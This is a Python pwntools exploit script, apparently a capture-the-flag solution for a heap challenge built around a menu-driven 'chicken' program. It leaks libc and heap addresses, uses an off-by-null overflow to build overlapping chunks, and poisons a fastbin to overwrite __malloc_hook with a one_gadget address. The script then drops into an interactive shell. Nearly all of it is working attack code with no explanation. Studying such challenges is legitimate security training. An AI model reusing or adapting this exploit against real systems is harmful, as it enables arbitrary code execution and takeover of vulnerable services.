
```python
        gdb.attach(p, gdbscript=gdbscript)
        pause()
    else:
        pass

def Add(size, data, mark):
    p.recvuntil(b"5.EXIT.\n")
    p.sendline(b'1')
    p.recvuntil(b"\x1B[1;33m Give me the size of the chicken. \x1B[0m\n")
    p.sendline(str(size).encode())
    p.recvuntil(b"\x1B[1;33m Give me the name of the chicken. \x1B[0m\n")
    p.send(data)
    p.recvuntil(b"\x1B[1;33m Give the chicken a mark. \x1B[0m\n")
    p.send(mark)

def Delete(idx):
    p.recvuntil(b"5.EXIT.\n")
    p.sendline(b'2')
    p.recvuntil(b"\x1B[1;33m Which chicken will you kill? \x1B[0m\n")
    p.sendline(str(idx).encode())

def Cook(idx, name, cook):
    p.recvuntil(b"5.EXIT.\n")
    p.sendline(b'3')
    p.recvuntil(b"\x1B[1;33m Which chicken will you cook? \x1B[0m\n")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Give me new name.\n")
    p.send(name)
    p.recvuntil(b"Give me Cook name.\n")
    p.send(cook)

def Black():
    p.recvuntil(b"5.EXIT.\n")
    p.sendline(b'4')

def get_libc():
    global __malloc_hook, libc_base
    Add(0x20, b'a'*20, b'b'*20) # 0 errmsg_0x90->unsorted
    Delete(0) # errmsg_0x90->unsorted
    Add(0x20, b'c'*20, b'd'*20) # 0 # unsorted->errmsg_0x90
    Black()
    #debug() # db1
    p.recvuntil(b"0\n")
    p.recvuntil(b"\x1B[1;33m ErrMsg \x1B[0m\n")
    libc_base = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3c4b78
    log.success("libc : 0x%x" % libc_base)
    __malloc_hook = libc_base + libc.symbols["__malloc_hook"]
    sleep(0.5)

def get_heap():
    global heap_addr
    Add(0x80, b'e'*0x20, b'f'*0x10) # 1
    Add(0x80, b'g'*0x20, b'h'*0x10) # 2
    Add(0x80, b'i'*0x20, b'j'*0x10) # 3
    Delete(1)
    Delete(3)
    #debug() # db2
    Add(0x20, b'i'*0x20, b'j'*0x10) # 1
    Cook(1, b'a'*0x10, b'cccccccn')
    Black()
    #debug() # db3
    p.recvuntil(b"1\n")
    p.recvuntil(b"\x1B[1;33m ErrMsg \x1B[0m\n")
    p.recvuntil(b'cccccccn')
    heap_addr = u64(p.recvline()[:-1].ljust(8, b'\x00'))
    log.success("heap : 0x%x" % heap_addr)
    sleep(0.5)

def get_shell():
    Add(0x80, b'i'*0x20, b'j'*0x10) # 3
    Add(0x60, p64(0) + p64(0x320) + p64(heap_addr+0x190) + p64(heap_addr+0x190), b'b'*0x10) # 4 first 0x71
    Add(0x60, b'c'*0x10, b'd'*0x10) # 5
    Add(0x60, b'e'*0x10, b'f'*0x10) # 6
    Add(0x60, b'h'*0x10, b'j'*0x10) # 7
    #debug() # db4
    Delete(6)
    #debug() # db5
    Add(0x68, b'k'*0x60 + p64(0x320), b'j'*0x10) # 6 off-by-null
    #debug() # db6
    Delete(6)
    #debug() # db7
    Add(0x2D0, b'a'*0x2A0 + p64(0) + p64(0x71) + p64(__malloc_hook-0x23) + p64(0xdeadbeef), b'b'*0x10) # 6
    #debug() # db8
    Delete(0)
    Delete(1)
    Delete(2)
    Add(0x60, b'a'*0x10, b'b'*0x10) # 0
    one = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
    Add(0x60, b'a'*0x13+p64(libc_base+one[1]), b'c'*0x10) # 1
    #gdb.attach(p, 'b *_dl_signal_error')
    Delete(4)
    #pause()
    sleep(0.5)

def pwn():
    connect()
    get_libc()
    get_heap()
    get_shell()
    p.interactive()

if __name__ == '__main__':
    pwn()
```
